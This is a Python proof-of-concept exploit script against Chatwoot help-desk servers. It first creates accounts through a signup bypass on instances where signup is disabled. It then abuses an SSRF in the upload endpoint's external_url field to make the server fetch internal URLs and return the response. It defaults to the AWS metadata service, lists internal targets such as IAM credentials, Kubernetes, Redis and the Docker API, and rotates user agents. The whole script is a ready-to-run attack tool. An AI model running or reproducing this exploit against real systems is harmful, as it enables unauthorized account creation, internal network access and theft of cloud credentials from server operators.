import argparse
import json
import os
import random
import ssl
import string
import sys
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional, Tuple


SIGNUP_BYPASS_MAX_VERSION = (4, 11, 2)
SSRF_MAX_VERSION          = (4, 12, 1)
SESSION_FILE = "woot_session.txt"
REQUEST_TIMEOUT = 10

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
]


def load_session(target: str) -> Optional[Tuple[str, int, str, str]]:
    if not os.path.exists(SESSION_FILE):
        return None
    try:
        with open(SESSION_FILE, "r") as f:
            data = json.load(f)
        key   = target.rstrip("/")
        entry = data.get(key)
        if not entry:
            return None
        return (
            entry["token"],
            int(entry["account_id"]),
            entry.get("email", ""),
            entry.get("password", ""),
        )
    except Exception:
        return None


def save_session(target: str, token: str, account_id: int,
                 email: str = "", password: str = "") -> None:
    data: dict = {}
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r") as f:
                data = json.load(f)
        except Exception:
            data = {}
    data[target.rstrip("/")] = {
        "token": token,
        "account_id": account_id,
        "email": email,
        "password": password,
    }
    with open(SESSION_FILE, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[+] Session saved → {SESSION_FILE}")


def clear_session() -> None:
    if os.path.exists(SESSION_FILE):
        os.remove(SESSION_FILE)
        print(f"[+] Session file {SESSION_FILE} deleted.")
    else:
        print(f"[*] No session file found ({SESSION_FILE}).")


def build_opener(proxy: Optional[str], no_ssl_verify: bool) -> urllib.request.OpenerDirector:
    handlers = []

    ssl_ctx = ssl.create_default_context()
    if no_ssl_verify:
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
    handlers.append(urllib.request.HTTPSHandler(context=ssl_ctx))

    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    else:
        handlers.append(urllib.request.ProxyHandler({}))

    opener = urllib.request.build_opener(*handlers)
    opener.addheaders = [("User-Agent", random.choice(_USER_AGENTS))]
    return opener


def do_request(
    opener: urllib.request.OpenerDirector,
    req: urllib.request.Request,
    allow_codes: Optional[list] = None,
) -> Tuple[bytes, dict]:
    allow_codes = allow_codes or []
    try:
        with opener.open(req, timeout=REQUEST_TIMEOUT) as resp:
            return resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        if e.code in allow_codes:
            return body, dict(e.headers)
        body_str = body.decode(errors="replace")
        if e.code == 401:
            try:
                msg = json.loads(body_str).get("error", body_str)
            except Exception:
                msg = body_str
            print(f"[-] 401 Unauthorized — {msg}")
            print("    Hint: token expired, wrong credentials, or wrong account-id.")
            sys.exit(1)
        if e.code == 403:
            print("[-] 403 Forbidden — token valid but insufficient permissions.")
            print("    Hint: ensure the token belongs to an agent or admin role.")
            sys.exit(1)
        if e.code == 404:
            print("[-] 404 Not Found — endpoint or account-id not found.")
            print("    Hint: confirm --target URL and --account-id.")
            sys.exit(1)
        print(f"[-] HTTP {e.code}: {body_str[:400]}")
        sys.exit(1)
    except urllib.error.URLError as e:
        print(f"[-] Connection error: {e.reason}")
        if "CERTIFICATE_VERIFY_FAILED" in str(e.reason):
            print("    Hint: add --no-ssl-verify to skip certificate validation.")
        sys.exit(1)


def get_version(opener: urllib.request.OpenerDirector, target: str) -> str:
    url = f"{target.rstrip('/')}/api"
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    try:
        body, _ = do_request(opener, req, allow_codes=[404, 422, 500, 502, 503])
        data = json.loads(body)
        return data.get("version", "unknown")
    except (Exception, SystemExit):
        return "unknown"


def parse_version(version_str: str) -> Tuple[int, ...]:
    try:
        return tuple(int(p) for p in version_str.split(".")[:3])
    except Exception:
        return (999, 999, 999)


def version_allows_signup_bypass(version_str: str) -> bool:
    return parse_version(version_str) <= SIGNUP_BYPASS_MAX_VERSION


def login(
    opener: urllib.request.OpenerDirector,
    target: str,
    email: str,
    password: str,
) -> Tuple[str, int]:
    url = f"{target.rstrip('/')}/auth/sign_in"
    payload = json.dumps({"email": email, "password": password}).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    body, _ = do_request(opener, req)
    data = json.loads(body).get("data", {})

    token = data.get("access_token")
    if not token:
        error = json.loads(body).get("error", "unknown error")
        print(f"[-] Login failed — {error}")
        print("    Hint: check email/password or use --token instead.")
        sys.exit(1)

    account_id = data.get("account_id")
    accounts   = data.get("accounts", [])

    print(f"[+] Authenticated via /auth/sign_in")
    print(f"    Token:      {token[:8]}...")
    if accounts:
        print(f"    Accounts:   {[(a['id'], a['name']) for a in accounts]}")
    if account_id:
        print(f"    Account ID: {account_id}")

    return token, account_id


def signup_bypass(
    opener: urllib.request.OpenerDirector,
    target: str,
    email: str,
    password: str,
    account_name: str,
    full_name: str,
) -> Tuple[str, int]:
    url = f"{target.rstrip('/')}/api/v1/accounts.json"
    payload = json.dumps({
        "account_name":            account_name,
        "user_full_name":          full_name,
        "email":                   email,
        "password":                password,
        "h_captcha_client_response": "",
    }).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    body, headers = do_request(opener, req, allow_codes=[422])

    try:
        parsed = json.loads(body)
    except Exception:
        print(f"[-] Signup bypass: unexpected non-JSON response:\n{body[:400]}")
        sys.exit(1)

    if b'"errors"' in body or b'"error"' in body:
        try:
            errors = parsed.get("errors") or parsed.get("error", "unknown")
        except Exception:
            errors = body.decode(errors="replace")[:200]
        print(f"[-] Signup bypass failed — {errors}")
        sys.exit(1)

    data  = parsed.get("data", {})
    token = data.get("access_token")
    account_id = data.get("account_id")

    if not token or not account_id:
        print(f"[-] Signup bypass: unexpected response — {parsed}")
        sys.exit(1)

    print(f"[+] Signup bypass successful")
    print(f"    Email:       {email}")
    print(f"    Password:    {password}")
    print(f"    Account:     {account_name} (id={account_id})")
    print(f"    Token:       {token[:8]}...")
    print(f"    Role:        {data.get('role', '?')}")

    return token, account_id


def _rand(chars: str, n: int) -> str:
    return "".join(random.choices(chars, k=n))


def random_email() -> str:
    local = _rand(string.ascii_lowercase + string.digits, 8)
    return f"{local}@pwned.local"


def random_password() -> str:
    base = (
        _rand(string.ascii_uppercase, 2)
        + _rand(string.ascii_lowercase, 6)
        + _rand(string.digits, 4)
        + "!@"
    )
    lst = list(base)
    random.shuffle(lst)
    return "".join(lst)


def random_name() -> str:
    return _rand(string.ascii_lowercase, 6).capitalize()


def trigger_ssrf(
    opener: urllib.request.OpenerDirector,
    target: str,
    account_id: int,
    token: str,
    ssrf_url: str,
) -> dict:
    endpoint = f"{target.rstrip('/')}/api/v1/accounts/{account_id}/upload"
    payload = json.dumps({"external_url": ssrf_url}).encode()
    req = urllib.request.Request(
        endpoint,
        data=payload,
        headers={
            "api_access_token": token,
            "Content-Type":     "application/json",
        },
        method="POST",
    )
    body, _ = do_request(opener, req)
    return json.loads(body)


def fetch_stored_content(
    opener: urllib.request.OpenerDirector,
    file_url: str,
    target: str,
    token: str,
) -> str:
    if file_url.startswith("/"):
        file_url = target.rstrip("/") + file_url
    req = urllib.request.Request(file_url, headers={"api_access_token": token})
    body, _ = do_request(opener, req)
    return body.decode(errors="replace")


def main():
    parser = argparse.ArgumentParser(
        description="Chatwoot SSRF PoC — CVE/upload external_url",
    )

    parser.add_argument("--target", required=True,
                        help="Chatwoot base URL (e.g. http://chatwoot.example.com)")
    parser.add_argument("--get-version", action="store_true",
                        help="Print Chatwoot version and exit")

    auth = parser.add_argument_group("Authentication (modes 1 & 2)")
    auth.add_argument("--email",      help="Login email (mode 1)")
    auth.add_argument("--password",   help="Login password (mode 1)")
    auth.add_argument("--token",      help="Existing API access token (mode 2)")
    auth.add_argument("--account-id", type=int, default=None,
                      help="Account ID — required with --token, auto-detected on login")

    signup = parser.add_argument_group(
        "Signup bypass (mode 3 — Chatwoot <= 4.11.2)",
        "signup disabled olsa bile hesap olusturma acigi"
    )
    signup.add_argument("--signup-bypass", action="store_true",
                        help="Activate signup bypass mode")
    signup.add_argument("--signup-email",    metavar="EMAIL",
                        help="Email for new account (default: random)")
    signup.add_argument("--signup-password", metavar="PASS",
                        help="Password for new account (default: random)")
    signup.add_argument("--signup-name",     metavar="NAME",
                        help="Account / user display name (default: random)")
    signup.add_argument("--force", action="store_true",
                        help="Skip version check in signup bypass mode")

    parser.add_argument(
        "--ssrf-url",
        default="http://169.254.169.254/latest/meta-data/",
        help="Internal URL the server should fetch (default: AWS IMDSv1)",
    )

    net = parser.add_argument_group("Network")
    net.add_argument("--proxy", metavar="URL",
                     help="HTTP proxy (e.g. http://127.0.0.1:8080 for Burp)")
    net.add_argument("--no-ssl-verify", action="store_true",
                     help="Disable SSL certificate verification")

    parser.add_argument("--demo-targets", action="store_true",
                        help="Print common SSRF target URLs and exit")
    parser.add_argument("--clear-session", action="store_true",
                        help=f"Delete saved session file ({SESSION_FILE}) and exit")

    args = parser.parse_args()

    if args.clear_session:
        clear_session()
        sys.exit(0)

    if args.demo_targets:
        demo = {
            "AWS IMDSv1 — credentials":   "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "AWS IMDSv1 — hostname":       "http://169.254.169.254/latest/meta-data/hostname",
            "AWS IMDSv1 — userdata":       "http://169.254.169.254/latest/user-data",
            "GCP metadata":               "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
            "Azure IMDS":                 "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Kubernetes API":             "https://kubernetes.default.svc/api",
            "Consul (internal)":          "http://127.0.0.1:8500/v1/agent/self",
            "Redis (internal)":           "http://127.0.0.1:6379/",
            "Prometheus metrics":         "http://127.0.0.1:9090/metrics",
            "Docker socket proxy":        "http://127.0.0.1:2375/info",
            "Sidekiq web (if exposed)":   "http://127.0.0.1:3000/monitoring/sidekiq",
        }
        print("Common SSRF targets:")
        for name, url in demo.items():
            print(f"  {name:<38} {url}")
        sys.exit(0)

    target = args.target.rstrip("/")
    if not target.lower().startswith(("http://", "https://")):
        parser.error(f"--target must be an http/https URL. Got: {target!r}")

    opener = build_opener(args.proxy, args.no_ssl_verify)

    if args.proxy:
        ssl_note = " (SSL verify OFF)" if args.no_ssl_verify else ""
        print(f"[*] Proxy: {args.proxy}{ssl_note}")

    if args.get_version:
        print(f"[*] Target: {target}")
        version = get_version(opener, target)
        v = parse_version(version)
        tags = []
        if v <= SSRF_MAX_VERSION:
            tags.append("SSRF")
        if v <= SIGNUP_BYPASS_MAX_VERSION:
            tags.append("SIGNUP-BYPASS")
        label = f"  [{', '.join(tags)}]" if tags else ""
        print(f"[+] Version: {version}{label}")
        sys.exit(0)

    mode_flags = [
        bool(args.email or args.password),
        bool(args.token),
        args.signup_bypass,
    ]
    if sum(mode_flags) > 1:
        parser.error("Use only one authentication mode at a time.")
    if sum(mode_flags) == 0:
        parser.error("Specify an authentication mode: --email/--password, --token, or --signup-bypass.")
    if args.token and args.account_id is None:
        parser.error("--account-id is required when using --token.")

    _run_exploit(target, args, opener)


def _run_exploit(
    target: str,
    args: argparse.Namespace,
    opener: urllib.request.OpenerDirector,
) -> None:

    ssrf_url = args.ssrf_url if args.ssrf_url.endswith("/") else args.ssrf_url + "/"

    print(f"[*] Target:  {target}")
    print("[*] Detecting Chatwoot version via GET /api ...")
    version = get_version(opener, target)
    print(f"[+] Version: {version}")

    token: str
    account_id: int

    if args.token:
        token      = args.token
        account_id = args.account_id
        print(f"[+] Using provided token: {token[:8]}...")
        print(f"    Account ID: {account_id}")

    elif args.email or args.password:
        token, discovered = login(opener, target, args.email, args.password)
        if args.account_id is not None:
            account_id = args.account_id
            print(f"    [!] --account-id override: using {account_id}")
        elif discovered:
            account_id = discovered
        else:
            print("[-] Could not determine account_id from login response.")
            print("    Use --account-id <id> to specify it manually.")
            sys.exit(1)

    else:
        saved = load_session(target)
        if saved:
            token, account_id, s_email, s_pass = saved
            print(f"[+] Loaded session from {SESSION_FILE}")
            print(f"    Email:      {s_email}")
            print(f"    Password:   {s_pass}")
            print(f"    Token:      {token[:8]}...")
            print(f"    Account ID: {account_id}")
        else:
            if not args.force:
                if not version_allows_signup_bypass(version):
                    print(f"\n[!] WARNING: Version {version} is ABOVE the known vulnerable range (<= 4.11.2).")
                    print("    The /api/v1/accounts endpoint likely enforces check_signup_enabled on this version.")
                    print("    Use --force to attempt anyway, or choose a different auth mode.")
                    sys.exit(1)
            else:
                if not version_allows_signup_bypass(version):
                    print(f"[!] --force: skipping version check (version={version}, expected <= 4.11.2)")

            s_email = args.signup_email    or random_email()
            s_pass  = args.signup_password or random_password()
            s_name  = args.signup_name     or random_name()

            print(f"\n[*] Signup bypass mode — creating new account ...")
            token, account_id = signup_bypass(opener, target, s_email, s_pass, s_name, s_name)
            save_session(target, token, account_id, email=s_email, password=s_pass)

    print(f"\n[*] Account ID : {account_id}")
    print(f"[*] SSRF URL   : {ssrf_url}")
    print(f"[*] Endpoint   : POST /api/v1/accounts/{account_id}/upload\n")

    print("[*] Sending SSRF request ...")
    result   = trigger_ssrf(opener, target, account_id, token, ssrf_url)
    file_url = result.get("file_url")
    blob_id  = result.get("blob_id")

    if not file_url:
        print(f"[-] Unexpected response (no file_url): {result}")
        sys.exit(1)

    print(f"[+] Server fetched the internal URL and stored the response.")
    print(f"    blob_id  : {blob_id}")
    print(f"    file_url : {file_url}")

    print("\n[*] Retrieving stored content (SSRF response body) ...")
    try:
        content = fetch_stored_content(opener, file_url, target, token)
        sep = "=" * 64
        print(f"\n{sep}")
        print(f"[+] SSRF RESPONSE — {len(content)} bytes  |  source: {ssrf_url}")
        print(sep)
        print(content[:4096])
        if len(content) > 4096:
            print(f"\n... (truncated — full size: {len(content)} bytes)")
        print(sep)
    except SystemExit:
        raise
    except Exception as exc:
        print(f"[-] Could not retrieve blob: {exc}")
        print(f"    Retrieve manually: GET {file_url}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
